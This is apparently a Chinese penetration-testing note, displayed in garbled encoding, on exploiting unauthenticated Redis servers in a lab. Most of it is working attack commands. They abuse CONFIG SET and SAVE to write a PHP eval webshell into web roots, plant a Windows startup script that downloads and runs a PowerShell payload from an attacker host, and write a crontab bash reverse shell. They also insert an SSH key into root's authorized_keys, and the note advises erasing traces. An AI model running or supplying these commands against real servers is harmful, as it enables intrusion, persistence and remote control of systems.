# å‚è€ƒé“¾æ¥
- [å¸¸è§çš„æœªæˆæƒè®¿é—®æ¼æ´æ€»ç»“](https://mp.weixin.qq.com/s/UjAh-dKs2YwoGyT-OaKatw)
- [Redisæœªæˆæƒè®¿é—®æ¼æ´æ€»ç»“](https://www.mad-coding.cn/2020/01/16/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#3-2-3-%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86)
- [æ¸—é€æµ‹è¯•ä¹‹åœ°åŸºæœåŠ¡ç¯‡ï¼šæœåŠ¡æ”»é˜²ä¹‹æ•°æ®åº“Redisï¼ˆä¸Šï¼‰](https://www.freebuf.com/articles/network/281140.html)
- [æ¸—é€æµ‹è¯•ä¹‹åœ°åŸºæœåŠ¡ç¯‡ï¼šæœåŠ¡æ”»é˜²ä¹‹æ•°æ®åº“Redisï¼ˆä¸‹ï¼‰](https://www.freebuf.com/articles/network/281162.html)


åˆ©ç”¨æ–¹å¼ï¼š

- å†™æ–‡ä»¶
   - Windows
      - å¼€æœºè‡ªå¯åŠ¨ç›®å½•
   - Linux
      - crontab
      - SSH key
   - Webshell

# 0x00 æ¼æ´ä»‹ç»
å†™æ–‡ä»¶åŸç†ï¼š
redisä¸­æœ‰ä¸€ç§æ•°æ®å¤‡ä»½çš„æ–¹å¼æ˜¯å¤‡ä»½è‡³`.rdb`æ–‡ä»¶ï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­çš„`dbfilename`ä¸­

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637852903390-c5f2a762-3fe3-4596-a6ae-44922dda2125.png#clientId=u5f93e79d-611b-4&from=paste&height=43&id=UNvRk&margin=%5Bobject%20Object%5D&name=image.png&originHeight=43&originWidth=324&originalType=binary&ratio=1&size=4544&status=done&style=none&taskId=uabf7eecd-0651-4578-a3f0-ac923845d5c&width=324)

è¿™ç§å¤‡ä»½æ–¹å¼æ˜¯æ ¹æ®æ—¶é—´çš„é¢‘ç‡æ¥è¿›è¡Œä¿å­˜çš„ã€‚

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637852915438-3c5c99f7-95ec-4f1f-8eaf-f8d409027e49.png#clientId=u5f93e79d-611b-4&from=paste&height=94&id=uc8602ba4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=94&originWidth=161&originalType=binary&ratio=1&size=3569&status=done&style=none&taskId=ue15d59e0-aa4c-4d3b-ac49-62e94572dbd&width=161)

ä½†æ˜¯redisä¸­æœ‰ä¸ª`config set`å‘½ä»¤å¯ä»¥ä¿®æ”¹redisè¿è¡Œæ—¶çš„é…ç½®é€‰é¡¹ã€‚
å…¶ä¸­`redis.conf`ä¸­æœ‰ä¸ª`**dir**`é€‰é¡¹å¯ä»¥é€‰æ‹©ä¿å­˜dump.rdbçš„ç›®å½•ï¼ˆå³å¤‡ä»½ç›®å½•ï¼‰ï¼Œé»˜è®¤æ˜¯å½“å‰ç›®å½•ï¼š

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637852949914-7b8dc401-cae6-484f-bc67-ad8cd0bca743.png#clientId=u5f93e79d-611b-4&from=paste&height=171&id=u93894967&margin=%5Bobject%20Object%5D&name=image.png&originHeight=171&originWidth=689&originalType=binary&ratio=1&size=20729&status=done&style=none&taskId=ub4ec2c94-fc38-402d-a3cc-80dad5023d0&width=689)

æˆ‘ä»¬å¯ä»¥æ§åˆ¶dirå’Œdbfilenameé€‰é¡¹ï¼Œè¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ¯”å¦‚ï¼šå°†shellå†™å…¥åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ï¼ˆå‡è®¾ä¸º/var/www/htmlï¼‰ä¸‹ï¼š

```bash
CONFIG SET dir /var/www/html     # ä¿®æ”¹å¤‡ä»½ç›®å½•
CONGIG SET dbfilename shell.php  # ä¿®æ”¹å¤‡ä»½æ–‡ä»¶åä¸ºæˆ‘ä»¬çš„shellå
```

`SAVE`å‘½ä»¤æ‰§è¡Œä¸€ä¸ªåŒæ­¥ä¿å­˜æ“ä½œï¼Œå°†å½“å‰ Redis å®ä¾‹çš„æ‰€æœ‰æ•°æ®å¿«ç…§(snapshot)ä»¥ RDB æ–‡ä»¶çš„å½¢å¼ä¿å­˜åˆ°ç¡¬ç›˜ã€‚

**é‡è¦çš„äº‹æƒ…è¦å…ˆè¯´ -- æ¸…é™¤ç—•è¿¹**

ï¼ˆ1ï¼‰åˆ é™¤key

`DEL key`

ï¼ˆ2ï¼‰å°†dirå’Œdbfilenameæ¢å¤ä¸ºåŸæ ·

æœ€å¥½ä½¿ç”¨ `config get dir` å’Œ `config get dbfilename` äº‹å…ˆçœ‹çœ‹åŸæ¥çš„å€¼æ˜¯å•¥ã€‚

# 0x01 ç¯å¢ƒæ­å»º
## 1.1 Windows
[redisçš„windowsç‰ˆæœ¬ä¸‹è½½åœ°å€](https://github.com/microsoftarchive/redis/releases)

ä¿®æ”¹é…ç½®æ–‡ä»¶redis.windows.conf ï¼Œå¼€å¯è¿œç¨‹è®¿é—®ï¼Œå…³é—­ä¿æŠ¤æ¨¡å¼ã€‚
```bash
ä¿®æ”¹bind 127.0.0.1ä¸ºbind 0.0.0.0
ä¿®æ”¹protected-mode yesä¸ºprotected-mode no
```
æŒ‡å®šredis.windows.confé…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨redisæœåŠ¡ã€‚
```bash
redis-server.exe  redis.windows.conf
```
ä½¿ç”¨redis-cli.exeæˆåŠŸè¿æ¥redisæœåŠ¡ã€‚
```bash
redis-cli.exe -h x.x.x.x
```
## 1.2 Linux
ç›®æ ‡ä¸»æœºï¼šcentos7

æ”»å‡»ä¸»æœºï¼škali

ï¼ˆ1ï¼‰ï¼šç›®æ ‡ä¸»æœºä¸‹è½½Redis 3.x

æºç ç¼–è¯‘æ–¹å¼ï¼š
```bash
wget http://download.redis.io/releases/redis-3.2.0.tar.gz
tar xzf redis-3.2.0.tar.gz
cd redis-3.2.0
make

# makeæŠ¥é”™è§£å†³
1. /bin/sh: cc: command not found
yum install gcc-c++

2. zmalloc.h:50:31: è‡´å‘½é”™è¯¯ï¼šjemalloc/jemalloc.hï¼šæ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•
make distclean
make && make install
```


ï¼ˆ2ï¼‰ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥è¿œç¨‹ç™»å½•

   - å°†bind 127.0.0.1å‰é¢æ³¨é‡Šæ‰ï¼›
   - ä¿®æ”¹ protected-mode ä¸º no

ï¼ˆ3ï¼‰é‡å¯redisæœåŠ¡
```bash
# å…³é—­é˜²ç«å¢™
service firewalld stop

# é‡å¯redisæœåŠ¡
src/redis-server redis.conf
```

ï¼ˆ4ï¼‰kaliå®‰è£…redis-cli
```bash
wget http://download.redis.io/redis-stable.tar.gz
tar -zxvf redis-stable.tar.gz
cd redis-stable
make
cp src/redis-cli /usr/bin/
```
ï¼ˆ5ï¼‰redis-cli çš„ä½¿ç”¨
```bash
redis-cli -h ip -p port -a 
```

# 0x03 æ¼æ´æ£€æµ‹
```bash
nmap -sV -p 6379 --script redis-info
redis-cli -h ip -p port -a å¯†ç 
```

# 0x04 åˆ©ç”¨æ–¹å¼
## 4.1 Windows

### 1ã€ç½‘ç«™ç»å¯¹è·¯å¾„å†™webshell

ğŸš© [ç½‘ç«™è·¯å¾„å­˜åœ¨ä¸­æ–‡å¦‚ä½•è§£å†³ï¼Ÿï¼Ÿ](https://github.com/reidmu/sec-note/tree/main/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Redis#%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84)

```bash
config set dir "E:/phpstudy_pro/WWW"
//åˆ‡æ¢ç›®å½•åˆ°ç½‘ç«™çš„æ ¹ç›®å½•

set x "\n\n\n<?php phpinfo();?>\n\n\n"
//å†™å…¥æ¶æ„ä»£ç åˆ°å†…å­˜ä¸­(1)

set xx "\n\n\n<?php @eval($_POST['cmd']);?>\n\n\n"
//å†™å…¥æ¶æ„ä»£ç åˆ°å†…å­˜ä¸­(2)

config set dbfilename shell.php
//åœ¨ç£ç›˜ä¸­ç”Ÿæˆæœ¨é©¬æ–‡ä»¶

save
//å°†å†…å­˜ä¹‹ä¸­çš„æ•°æ®å¯¼å‡ºåˆ°ç£ç›˜æ–‡ä»¶
```
phpinfoè·å–ç½‘ç«™ç»å¯¹è·¯å¾„ï¼š

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637663468168-b4faa0b5-0518-4dc0-8c7b-a325e5d96c05.png#clientId=u780fef54-e9bc-4&from=paste&id=ud7587e6c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=32&originWidth=578&originalType=binary&ratio=1&size=3244&status=done&style=none&taskId=u1024e06d-071b-4cb7-9abf-0aec4e15006)

èšå‰‘è¿æ¥`http://ip/shell.php`

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637663607313-142844f1-6ad9-41fd-a054-a781b40a0581.png#clientId=u780fef54-e9bc-4&from=paste&height=333&id=ubf820056&margin=%5Bobject%20Object%5D&name=image.png&originHeight=665&originWidth=966&originalType=binary&ratio=1&size=61178&status=done&style=none&taskId=ud6c89788-a069-4a6c-ad92-94912f82070&width=483)



### 2ã€å¼€æœºè‡ªå¯åŠ¨ç›®å½•
ç¼ºç‚¹ï¼šéœ€è¦é¶æœºæœåŠ¡å™¨é‡å¯ã€‚

1ï¼‰csç”Ÿæˆpowershellä¸€å¥è¯

![image](https://user-images.githubusercontent.com/84888757/173838744-51aa77fe-ef2c-4e11-8785-c1c4a62816d9.png)


2ï¼‰redis-cliæ‰§è¡Œå‘½ä»¤
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('[http://x.x.x.x:80/a'))"](http://x.x.x.x:80/a'))")
```bash
config set dir "C:/Users/lin/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/"

config set dbfilename lin.bat

set x "\r\n\r\npowershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://x.x.x.x:80/a'))\"\r\n\r\n"

save
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637671875105-d841b053-911c-4542-b600-8c61e57578b3.png#clientId=u7c60ad7c-68e7-4&from=paste&id=u7adcc035&margin=%5Bobject%20Object%5D&name=image.png&originHeight=211&originWidth=1277&originalType=binary&ratio=1&size=59336&status=done&style=none&taskId=u5430ff56-412c-4aa4-b807-dfe32cb09d9)

4ï¼‰å¯ä»¥çœ‹åˆ°ç›®æ ‡æœºçš„å¯åŠ¨é¡¹ä¸‹æˆåŠŸå¯åŠ¨lin.batæ–‡ä»¶

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637670125433-ca601d0d-bc6b-4d79-8709-deb3df01625f.png#clientId=uf518f69f-ca34-4&from=paste&height=117&id=u65d888f7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=156&originWidth=867&originalType=binary&ratio=1&size=25527&status=done&style=none&taskId=u29b71645-b288-4171-81d1-001f5b28baa&width=650)

5ï¼‰é‡å¯ä¹‹åï¼Œè·å¾—shell

![image](https://user-images.githubusercontent.com/84888757/173838982-371d39a1-aa66-4aa1-8823-f570eda63e45.png)


### 3ã€è®¡åˆ’ä»»åŠ¡ï¼ˆå¤±è´¥ï¼‰
é—®é¢˜è®°å½•ï¼š

- windowsåœ¨å‘½ä»¤è¡Œæ‰§è¡Œè®¡åˆ’ä»»åŠ¡ï¼Œä¼šå°†ä»»åŠ¡å`shell`ä¿å­˜è‡³`C:/Windows/System32/Tasks`æ–‡ä»¶å¤¹ä¸‹ï¼Œshellæ–‡ä»¶ä¸­æ­£å¸¸ä¼šæ˜¯ä¸ª`xml`æ–‡ä»¶ï¼Œè€Œé€šè¿‡å†™æ–‡ä»¶çš„æ–¹å¼ï¼Œåªæ˜¯å°†åˆ›å»ºè®¡åˆ’ä»»åŠ¡çš„å‘½ä»¤å†™å…¥æ–‡ä»¶`shell`ä¸­ï¼Œå¦‚ä½•æ‰§è¡Œå‘½ä»¤ï¼Ÿ
- æŒ‰å¦‚ä¸‹æ­¥éª¤å†™å…¥`bat`æ–‡ä»¶å’Œè®¡åˆ’ä»»åŠ¡å‘½ä»¤è¡Œæ–‡ä»¶ï¼Œå‘ç°`bat`æ–‡ä»¶ä¸­åŒ…æ‹¬äº†`powershell`ä¸€å¥è¯ä»¥åŠè®¡åˆ’ä»»åŠ¡å‘½ä»¤ï¼Ÿï¼Ÿï¼Ÿ
- è€ƒè™‘å†™è®¡åˆ’ä»»åŠ¡é‚£ä¸€æ­¥ç›´æ¥å†™å…¥xmlæ–‡ä»¶ï¼Ÿ


## 4.2 Linux
### 4.2.1 åˆ©ç”¨crontab è®¡åˆ’ä»»åŠ¡åå¼¹shell
æ¡ä»¶ï¼šcentos

åŸå› :
**è¿™æ˜¯ç”±äºrediså‘ä»»åŠ¡è®¡åˆ’æ–‡ä»¶é‡Œå†™å†…å®¹å‡ºç°ä¹±ç è€Œå¯¼è‡´çš„è¯­æ³•é”™è¯¯ï¼Œè€Œä¹±ç æ˜¯é¿å…ä¸äº†çš„ï¼Œcentosä¼šå¿½ç•¥ä¹±ç å»æ‰§è¡Œæ ¼å¼æ­£ç¡®çš„ä»»åŠ¡è®¡åˆ’ï¼Œè€Œubuntuå¹¶ä¸ä¼šå¿½ç•¥è¿™äº›ä¹±ç ï¼Œæ‰€ä»¥å¯¼è‡´å‘½ä»¤æ‰§è¡Œå¤±è´¥**

ï¼ˆ1ï¼‰ä½¿ç”¨vpsè¿›è¡Œç›‘å¬ï¼š
```bash
nc -lvvp 1234
```

ï¼ˆ2ï¼‰è¿›å…¥rediså‘½ä»¤æ‰§è¡Œç•Œé¢ï¼Œå†™å…¥åå¼¹shellï¼š `redis-cli -h é¶æœºip`
```bash
auth å¯†ç 			# è‹¥ä¸æ˜¯æœªæˆæƒï¼Œå¯ä½¿ç”¨æ­¤æ¡å‘½ä»¤è¿›è¡Œå¼±å£ä»¤ç™»å½•ï¼›è‹¥æ˜¯æœªæˆæƒæ¼æ´åˆ™å¿½ç•¥æ­¤æ¡å‘½ä»¤ã€‚

# æ˜Ÿå·è¡¨ç¤ºçš„æ˜¯è®¡åˆ’ä»»åŠ¡çš„æ—¶é—´
set test "\n* * * * * /bin/bash -i >& /dev/tcp/æ”»å‡»æ–¹ip/1234 0>&1\n"

config set dir /var/spool/cron/
config set dbfilename root

save
```
è¿‡ä¸€åˆ†é’Ÿå·¦å³å¯ä»¥æ”¶åˆ°åå¼¹çš„shellï¼Œä½†æ˜¯è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªé€‚ç”¨äºcentosä¸Šå¼€å¯çš„æœåŠ¡ï¼Œubuntuä¸Šä¸è¡Œã€‚

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637572431899-c75dd18b-f97b-444b-bb72-a74fcfbd584a.png#clientId=u9e20ed45-5375-4&from=paste&height=100&id=u8a507155&margin=%5Bobject%20Object%5D&name=image.png&originHeight=133&originWidth=548&originalType=binary&ratio=1&size=37591&status=done&style=none&taskId=uea136dec-6dce-4db4-ba52-ae08d70cce0&width=411)

### 4.2.2 SSHå¯†é’¥ç™»å½•
#### 1ã€æ¼æ´åŸç†
åœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå°†æœ¬æœºçš„å…¬é’¥ä½œä¸ºvalueï¼Œkeyå€¼éšæ„ï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„ç¼“å†²æ–‡ä»¶authorized.keysï¼ŒæŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨é¶æœºç«¯çš„/root/.sshä¸‹ç”Ÿæˆä¸€ä¸ªæˆæƒkey

> authorized_keysæ–‡ä»¶æ˜¯ä»€ä¹ˆï¼Ÿ
> æˆ‘ä»¬éœ€è¦æœ¬åœ°æœºå™¨sshè®¿é—®è¿œç¨‹æœåŠ¡å™¨æ—¶ä¸ºäº†å‡å°‘è¾“å…¥å¯†ç çš„æ­¥éª¤ï¼ŒåŸºæœ¬ä¸Šéƒ½ä¼šåœ¨æœ¬åœ°æœºå™¨ç”Ÿæˆsshå…¬é’¥ï¼Œç„¶åå°†æœ¬åœ°sshå…¬é’¥å¤åˆ¶åˆ°è¿œç¨‹æœåŠ¡å™¨çš„.ssh/authorized_keysä¸­ï¼Œè¿™æ ·å°±å¯ä»¥å…å¯†ç™»å½•äº†ã€‚ï¼ˆ æœåŠ¡å™¨ä¹‹é—´è®¿é—®åŒç†ï¼‰ã€‚
> 
> æµç¨‹å¦‚ä¸‹ï¼š
> 1. æœ¬æœºç”Ÿæˆ sshå…¬é’¥ï¼›
> 2. å¤åˆ¶æœ¬æœºå…¬é’¥åˆ°è¿œç¨‹æœåŠ¡å™¨.ssh/authorized_keysä¸­ï¼Œauthorized_keysæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºï¼›
> 3. æœ¬æœºç›´æ¥sshè¿æ¥è¿œç¨‹ï¼›
> 4. ç»“æŸ
> 

#### 2ã€åˆ©ç”¨æ¡ä»¶
rediså¯¹å¤–å¼€æ”¾ï¼Œä¸”æ˜¯æœªæˆæƒè®¿é—®çŠ¶æ€ï¼Œå¹¶ä¸”redisæœåŠ¡sshå¯¹å¤–å¼€æ”¾ï¼Œå¯ä»¥é€šè¿‡keyç™»å…¥ã€‚

- RedisæœåŠ¡ä½¿ç”¨**ROOT**è´¦å·å¯åŠ¨
- æœåŠ¡å™¨å¼€æ”¾äº†SSHæœåŠ¡ï¼Œè€Œä¸”å…è®¸ä½¿ç”¨å¯†é’¥ç™»å½•ï¼Œå³å¯è¿œç¨‹å†™å…¥ä¸€ä¸ªå…¬é’¥ï¼Œç›´æ¥ç™»å½•è¿œç¨‹æœåŠ¡å™¨ã€‚
- é¶æœºçš„rootç›®å½•ä¸‹éœ€è¦æœ‰.sshç›®å½•

#### 3ã€æ¼æ´å¤ç°
é¶æœºå¼€å¯sshæœåŠ¡
```bash
# debian
/etc/init.d/ssh start

# CentOS7
service sshd start
```

åœ¨æ”»å‡»æœºä¸Šæ‰§è¡Œï¼š
ï¼ˆ1ï¼‰sshå…å¯†ç é…ç½®
æ”»å‡»æœºä¸Šåˆ›å»ºssh-rsaå¯†é’¥ï¼Œä¹Ÿå°±æ˜¯ç”Ÿæˆkeyï¼Œè¿™é‡Œå¯†ç ææˆç©ºï¼Œå…¨éƒ¨é»˜è®¤å³å¯
```bash
#ç”Ÿæˆå…¬é’¥/ç§é’¥å¯¹,ä¸€è·¯å›è½¦ã€‚
ssh-keygen -t rsa -P ''

cd /root/.ssh/

#å°†å…¬é’¥å†™å…¥ key.txt æ–‡ä»¶ï¼Œä¸ºäº†é¿å…ä¼šæ‹¼æ¥åœ¨å…¶ä»–å­—ç¬¦ä¸²åé¢æˆ–è¢«å…¶ä»–å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè¿™é‡Œåœ¨å…¬é’¥ä¸Šä¸‹åŠ ä¸¤è¡Œç©ºè¡Œï¼Œç”¨äºé˜²æ­¢ä¹±ç ã€‚
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt  
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637570633641-d8a86e7b-3f9f-485a-b9f9-799698164e40.png#clientId=u9e20ed45-5375-4&from=paste&id=ua72818fc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=38&originWidth=340&originalType=binary&ratio=1&size=9092&status=done&style=none&taskId=ua23259b5-3488-4b2a-b00a-9e18e3e7889)

> id_rsa.pubé‡Œæ˜¯å…¬é’¥ï¼Œå¦‚æœéœ€è¦ç™»å½•åˆ°è¿œç¨‹ä¸»æœºï¼Œéœ€è¦åˆ°è¿œç¨‹ä¸»æœº/home/root/.sshç›®å½•ä¸‹ï¼Œæ–°å»ºauthorized_keysæ–‡ä»¶ï¼Œå¹¶å°†id_rsa.pubé‡Œçš„å†…å®¹å¤åˆ¶è¿›å»

> sshå…¬é’¥ç”Ÿæ•ˆéœ€æ»¡è¶³è‡³å°‘ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶ï¼š
> 1 .sshç›®å½•çš„æƒé™å¿…é¡»æ˜¯700ï¼›
> 2 .ssh/authorized_keysæ–‡ä»¶æƒé™å¿…é¡»æ˜¯600ï¼›

ï¼ˆ2ï¼‰è¿æ¥rediså†™å…¥æ–‡ä»¶
```bash
# è¿™é‡Œçš„crackitå¯ä»¥æ˜¯ä»»æ„åå­—ï¼Œç›®çš„æ˜¯ä¸ºäº†ä¼ é€’å‰é¢çš„ssh.txtæ–‡ä»¶
# -x ä»£è¡¨ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ä½œä¸ºè¯¥å‘½ä»¤çš„æœ€åä¸€ä¸ªå‚æ•°ã€‚
# è¿™é‡Œçš„ xin å¯ä»¥ä¿®æ”¹ä¸ºä»»æ„å
cat key.txt | redis-cli -h 192.168.210.177  -x set xin 

```
       å¯ä»¥çœ‹åˆ°æˆåŠŸå†™å…¥ï¼š
       
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637571146976-249054a6-2b1a-42f4-8732-ed1b2bb195f9.png#clientId=u9e20ed45-5375-4&from=paste&height=125&id=u485e9bbd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=167&originWidth=419&originalType=binary&ratio=1&size=35224&status=done&style=none&taskId=u48d2d774-f8f2-43d8-9855-ed7e5c288c1&width=314)

```bash
# è¿æ¥redisï¼Œè®¾ç½®è·¯å¾„å’Œä¿å­˜çš„æ–‡ä»¶åï¼Œå°†å†…å­˜å˜é‡å¯¼å…¥ç£ç›˜æ–‡ä»¶
redis-cli -h 192.168.210.177
config set dir /root/.ssh/
config get dir
config set dbfilename authorized_keys
save
```
**è¸©å‘ï¼š**

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637571260191-07c47d16-07d9-4f9b-99b4-f8893b7e12e0.png#clientId=u9e20ed45-5375-4&from=paste&id=u94e7e5c7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=63&originWidth=468&originalType=binary&ratio=1&size=19169&status=done&style=none&taskId=ua92ec418-ee0d-44d9-9bbd-e922ff37d14)  

è¿™é‡ŒæŠ¥é”™çš„æ„æ€æ˜¯é¶æœºæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ç›®å½•ï¼Œ åŸå› æ˜¯.ssh æ˜¯è®°å½•å¯†ç ä¿¡æ¯çš„æ–‡ä»¶å¤¹ï¼Œå¦‚æœæ²¡æœ‰ç”¨rootç”¨æˆ·ç™»å½•è¿‡çš„è¯ï¼Œå°±æ²¡æœ‰ .ssh æ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨é¶æœºä¸Šæ‰§è¡Œä¸‹é¢è¿™æ¡å‘½ä»¤å³å¯ï¼ˆä¹Ÿå¯ä»¥æ‰‹åŠ¨åˆ›å»º.sshç›®å½•ï¼‰ï¼š
```bash
ssh localhost
```

æ­¤æ—¶ï¼Œå¯æˆåŠŸå¯¼å…¥ï¼š

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637571417359-754f4557-6886-4fe9-8c15-276a9d4dcc07.png#clientId=u9e20ed45-5375-4&from=paste&id=u387911ca&margin=%5Bobject%20Object%5D&name=image.png&originHeight=116&originWidth=486&originalType=binary&ratio=1&size=29778&status=done&style=none&taskId=u25af95b9-7e1b-4f72-b56a-f911a829b33)

ï¼ˆ3ï¼‰åˆ©ç”¨ç§é’¥æˆåŠŸç™»å½•redisæœåŠ¡å™¨
```bash
ssh -i id_rsa root@192.168.210.177
æˆ–è€…
ssh 192.168.210.177
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637571815241-172a3a28-ee7c-4b84-a8eb-4e1661a781ca.png#clientId=u9e20ed45-5375-4&from=paste&height=472&id=ue407ae1b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=629&originWidth=733&originalType=binary&ratio=1&size=236912&status=done&style=none&taskId=ue140237f-f655-4649-b958-39b8b66148c&width=550)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637571872442-c6214cb9-cc95-4c80-9ff7-58f4c9ebb7bd.png#clientId=u9e20ed45-5375-4&from=paste&height=415&id=uf5488e43&margin=%5Bobject%20Object%5D&name=image.png&originHeight=554&originWidth=663&originalType=binary&ratio=1&size=197877&status=done&style=none&taskId=u0cc9ed9d-7edb-480c-b875-c47c26b7f6a&width=497)

**å‘ç‚¹ï¼š**
ç›®æ ‡ä¸»æœºå¿…é¡»å¼€å¯äº†å¯†é’¥ç™»å½•æ‰èƒ½åˆ©ç”¨ã€‚
sshç¬¬ä¸€æ¬¡è¿æ¥æ—¶è¦åŠ ä¸Š -o StrictHostKeyChecking=noï¼Œä¸ç„¶å¯èƒ½ä¸€ç›´è¿ä¸ä¸Šã€‚
`ssh  -o StrictHostKeyChecking=no x.x.x.x`

### 4.2.3 ç½‘ç«™ç»å¯¹è·¯å¾„å†™ Webshell
æ¡ä»¶ï¼šéœ€è¦æ‰¾åˆ°ç½‘ç«™æ ¹ç›®å½•çš„è·¯å¾„ã€‚

å‚è€ƒé“¾æ¥ï¼š

- [https://www.hackersb.cn/Linux/153.html](https://www.hackersb.cn/Linux/153.html)

```bash
config set dir /var/www/html/
//åˆ‡æ¢ç›®å½•åˆ°ç½‘ç«™çš„æ ¹ç›®å½•

set x "\n\n\n<?php phpinfo();?>\n\n\n"
//å†™å…¥æ¶æ„ä»£ç åˆ°å†…å­˜ä¸­(1)

set xx "\n\n\n<?php @eval($_POST['cmd']);?>\n\n\n"
//å†™å…¥æ¶æ„ä»£ç åˆ°å†…å­˜ä¸­(2)

config set dbfilename shell.php
//åœ¨ç£ç›˜ä¸­ç”Ÿæˆæœ¨é©¬æ–‡ä»¶

save
//å°†å†…å­˜ä¹‹ä¸­çš„æ•°æ®å¯¼å‡ºåˆ°ç£ç›˜æ–‡ä»¶
```

èšå‰‘è¿æ¥`http://ip/shell.php`

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637569399808-ee099e13-a7c9-4924-b8ac-a94dc2a989c0.png#clientId=u345e72bb-8f33-4&from=paste&height=263&id=u10a9e290&margin=%5Bobject%20Object%5D&name=image.png&originHeight=526&originWidth=774&originalType=binary&ratio=1&size=40830&status=done&style=none&taskId=ufda7f324-9452-4c6e-9e9a-1b44fdccfd1&width=387)

### 4.2.4 ä¸»ä»å¤åˆ¶RCEï¼ˆç•™åˆ°ä¸‹ä¸€éƒ¨åˆ†å†™ï¼‰
å¦‚æœæ²¡å†™å…¥æƒé™ï¼Œæˆ–è€…éƒ¨åˆ†å‘½ä»¤è¢«ç¦ç”¨ï¼Œå¯ä»¥ç”¨ç¬¬äºŒç§ï¼Œåˆ©ç”¨Redisçš„**ä¸»ä»å¤åˆ¶**çš„åŠŸèƒ½ï¼Œå¯¼å…¥ä¸€ä¸ªsoæ–‡ä»¶ï¼Œå®ç°å‘½ä»¤æ‰§è¡Œã€‚
#### æ¼æ´åŸç†

[https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)

#### exp

[https://github.com/LoRexxar/redis-rogue-server/blob/master/redis-rogue-server.py](https://github.com/LoRexxar/redis-rogue-server/blob/master/redis-rogue-server.py)




